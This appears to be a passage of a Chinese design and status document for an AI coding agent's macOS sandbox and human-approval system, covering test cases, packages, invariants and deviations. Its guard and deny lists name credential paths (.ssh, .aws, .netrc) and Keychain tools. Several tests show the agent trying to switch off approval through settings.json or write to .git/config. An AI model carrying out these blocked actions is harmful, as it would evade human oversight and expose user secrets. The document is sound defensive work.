| D8 | Cordis | 卸载 `sandbox-macos` 后再执行 | 抛 `SandboxUnavailable`，**不**回退直连；`pgrep` 断言无残留 `sandbox-exec` |
| D9 | Cordis | 执行中卸载 `shell-sandboxed` | `fiber.dispose()` 返回前子进程已死；stdout 未泄漏；无僵尸 |
| D10 | Cordis | 卸载规则源插件后重载 | 规则立即失效；指纹从 0 开始（generation 生效） |
| D11 | Cordis | 全量装载 `cordis.yml` | 5 秒内无 Fiber 停在 PENDING（环检测） |
| D12 | Cordis | 卸载 `sandbox` 时有 pending 审批 | 审批被 deny，turn 不悬挂 |
| D13 | 安全 | `bypassApprovals: true` + `kind:'escalation'` | 仍然要人工确认 |
| D14 | 安全 | `tool-fs` 写 `.git/config`（无 bash 沙箱） | 抛 `PathGuardError` |
| D15 | 安全 | 沙箱内改 `.ruobai/settings.json` 把 `bypassApprovals` 置 true | 写入被拒不生效（T5） |

## 附录 E：实施状态（M0 + M1 + M2 骨架已落地）

### E.1 已落地的包

| 包 | 形态 | 关键文件 | 职责 |
|---|---|---|---|
| `@ruobai/shell` | `Service` → `ctx.shell` | `packages/shell/src/index.ts` | 执行器注册表；`register()` 返回 disposer；无执行器时 `ShellUnavailableError`（fail-closed） |
| `@ruobai/shell-direct` | 类插件 | `packages/shell-direct/src/index.ts` | 直连执行器（等价改造前行为）+ `SECRET_ENV` 清洗 + 进程组回收 |
| `@ruobai/shell-sandboxed` | 函数式对象插件 | `packages/shell-sandboxed/src/index.ts` | 默认执行器：`sandbox.execute` → `denial.classify` → `escalation.escalate` → 单次放宽重跑 |
| `@ruobai/sandbox` | `Service` → `ctx.sandbox` | `packages/sandbox/src/{index,types}.ts` | provider 注册表、run 登记、卸载兜底；`execute()` 不返回句柄 |
| `@ruobai/sandbox-policy` | `Service` → `ctx.sandboxPolicy` | `packages/sandbox-policy/src/index.ts` | 平台无关 IR、guard 表、`canonicalPath`/`check()`（realpath + NFC + 大小写折叠） |
| `@ruobai/sandbox-guards` | 类插件 | `packages/sandbox-guards/src/index.ts` | 11 条默认守卫（`.git`/`.ruobai`/`.env`/`.ssh`/`.aws`/gh/docker/.netrc/rc 文件/LaunchAgents/托管策略目录） |
| `@ruobai/sandbox-macos` | **对象插件（`apply` async）** | `packages/sandbox-macos/src/{index,sbpl}.ts` | SBPL 编译（纯函数）、路径 realpath、自检探针、`sandbox-exec -f /dev/fd/3` 执行、进程组回收 |
| `@ruobai/sandbox-denial` | `Service` → `ctx.denial` | `packages/sandbox-denial/src/index.ts` | 归因（native-log + stderr + exit code + 命令文本）、指纹、重复抑制、generation |
| `@ruobai/sandbox-native-log` | 类插件 | `packages/sandbox-native-log/src/index.ts` | `log stream` 探针；子进程本身挂在 effect 的 disposer 上 |
| `@ruobai/sandbox-escalation` | `Service` → `ctx.escalation` | `packages/sandbox-escalation/src/index.ts` | 可放宽性判定、exemption 构造、重跑安全分类、会话级授权 |
| `@ruobai/approval`（扩展） | `Service` → `ctx.approval` | `packages/approval/src/index.ts` | `kind: 'tool' \| 'escalation'`、内核 deadline（clamp 5s–10min，`onTimeout` 只有 `'deny'`）、`rules.register(RuleSource)` |
| `@ruobai/approval-deadline` | 类插件 | `packages/approval-deadline/src/index.ts` | 只调参不开关：`setDeadlinePolicy` 的 disposer 恢复默认 |

### E.2 测试（真实执行，非 mock）

| 套件 | 用例数 | 覆盖 |
|---|---|---|
| `packages/sandbox-macos/tests/compile.spec.ts` | 13 | `(deny default)` 姿态、guard→deny 一一对应、exemption 只删命中那条、网络三模式、**禁止 `(subpath "/")`**、写根为空告警 |
| `packages/sandbox-policy/tests/policy.spec.ts` | 11 | glob 语义、subpath/exact、大小写折叠 + NFD、软链解析（不存在目标的祖先解析）、version bump、read-only 快照、guard disposer 后快照干净 |
| `packages/sandbox/tests/service.spec.ts` | 9 | 无 provider fail-closed、不可用 provider 被隐藏、handle 回收（含 provider 抛错）、**先摘表再回收**、双挂载恢复、卸载 abort 在飞 run、文件 IO 走 provider、relax 透传 |
| `packages/sandbox-denial/tests/denial.spec.ts` | 12 | 日志行解析、operation→kind、pid 归因、`execvp`/exit 71、静默网络失败、无 policy 时降级 `unknown`、指纹重复计数、**卸载后计数归零**、事件序列 |
| `packages/shell/tests/shell.spec.ts` | 8 | 无执行器 fail-closed、默认切换、重复 id、disposer 后 fail-closed、before/after 事件、卸载清表 |
| `packages/shell-sandboxed/tests/seatbelt.spec.ts` | 18 | 真实 `sandbox-exec`：自检可用、正常命令、`.git` 写入拒绝、read guard 拒绝、loopback 网络拒绝、provider 卸载后 fail-closed、**deny→审批→重跑成功且 profile digest 变化**、拒绝后结构化返回、网络不升级、`escalate: never`、bypass 下仍弹、`.ruobai/settings.json` 不可写、`~/.zshrc`/osascript 不可写、`security` 不可执行、**热卸载杀进程组** |
| `packages/approval/tests/escalation.spec.ts` | 10 | escalation 不受 bypass、tool 仍受 bypass、忽略 permission full-access、`kind` 透出、**always 不写盘**、deadline 到点 deny + 事件、clamp、恢复默认、跨来源 deny>ask>allow、规则源卸载即失效 |

运行：`npx vitest run`（全仓 355+ 用例通过）、`npx tsc -p tsconfig.json`、`PORT=4399 npx tsx apps/cli/src/bin.ts`（启动日志出现 `sandbox seatbelt provider ready (profile <sha256>)`）。

### E.3 与设计文档的偏差（每条都有实测或机制上的理由）

| # | 设计原文 | 实现 | 理由 |
|---|---|---|---|
| 1 | `deploy/seatbelt-baseline.sb` 静态基线片段 | 内联 `BASELINE_EXEC`/`BASELINE_READ` 常量 | 基线必须与编译器和快照测试同源，否则"profile 是什么"分裂在两处 |
| 2 | `(deny mach-lookup)` 掐 Keychain | `machLookup` 默认 `allow`；改由 `deniedExecutables` 掐 `security`/`osascript`/`launchctl` 等 | 实测（A15 同批）：deny mach-lookup 会让 node/npm 类工具大面积失败；CLI 通道才是可被 agent 直接利用的路径 |
| 3 | `(deny process-info*)` | `processInfo` 默认 `allow` | A15：`process-info-pidinfo self` 被拒 → curl **SIGTRAP**。进程控制遏制由 `(deny signal (target others))` + `(deny appleevent-send)` 承担 |
| 4 | 低置信度时"只允许问人，不许放宽" | 低置信度仍可升级问人，但 `retry` 强制 `'unsafe'` | 若把"低置信度"等同于"不可升级"，在没有 log 探针的机器上 escalation 完全不可达（没有 exemption 就无法重跑）；"问人"仍是人工决策，不是自动放宽 |
| 5 | provider 只返回原始拒绝 | `SandboxRunResult` 增加 `pids`，归因由 `ctx.denial` 按 pid 合并 | 原生日志是系统广播，只有 provider 知道本次 run 的 pid 集合；让 provider 直接分类会把 SBPL 词汇泄漏进语义层 |
| 6 | `Exemption` 三种 | 一致，但 `write-root` 取 `dirname(target)` | 使 `fs-write-outside` 也能做最小化放宽（单个目录而非整个写策略） |

### E.4 尚未实施（M3/M4）

- 规则来源插件 `approval-rules-managed` / `-project` / `-session`：接口 `ctx.approval.rules.register(RuleSource)` 已就绪并测试，但只有 user 级走现有 `settings`。
- 项目级 `<ws>/.ruobai/sandbox.json` 的额外 write 根与额外 guard（当前只有 `sandbox-guards` 的 `extra` 配置）。
- `sandbox-web`：IR 摘要 / guard 列表 / denial 时间线面板。
- `@ruobai/sandbox-net-proxy`（`net.mode='proxy'` 的编译器分支已写，但没有代理进程）。
- `bin/rbu-jail` + `deploy/harness-jail.sb` 进程级 jail。
- 孤儿清扫（`.ruobai/sandbox-runs.jsonl`）：当前只保证回收自己 spawn 的进程树（E.2 的"热卸载杀进程组"用例）。
- `sandbox-policy` 的 `permissions` 集成只覆盖 read-only；`full-access` 默认仍不给 home 写（`allowFullAccessWrite: false`）。

### E.5 关键不变式 → 代码位置

| 不变式 | 落点 |
|---|---|
| 没有 provider 就拒绝执行，绝不直连 | `SandboxService.execute` / `ShellService.run` 抛错；`tool-bash` 只调 `ctx.shell` |
| 沙箱与审批零依赖 | `sandbox`/`sandbox-policy`/`sandbox-denial` 的 `inject` 里没有 `approval`（见各 `static inject`） |
| 卸载先摘能力再回收 | `SandboxService.registerProvider` 的 disposer：`delete` → `destroyAll()` |
| `fiber.dispose()` 等子进程死透 | `SeatbeltProvider.destroy` 的 `killGroup` + `await close`；`shell-direct.killGroup` 同理 |
| 放宽只删一条 deny | `compileProfile` 的 `emitGuards` + `exempted()`；测试 D2 逐字节比对 |
| 超时必 deny 且不可关 | `ApprovalService.awaitDecision`；`DeadlinePolicy.onTimeout` 类型只有 `'deny'` |
| 规则卸载即失效 | `ApprovalService.registerRuleSource` 的 disposer 里 `sources.delete` |
| 热重载不继承旧计数 | `DenialService` 的 `generation` + effect disposer 清表 |
| 守卫路径必须 vnode 真实 | `resolvePolicyPaths` / `realpathOr`（A16） |
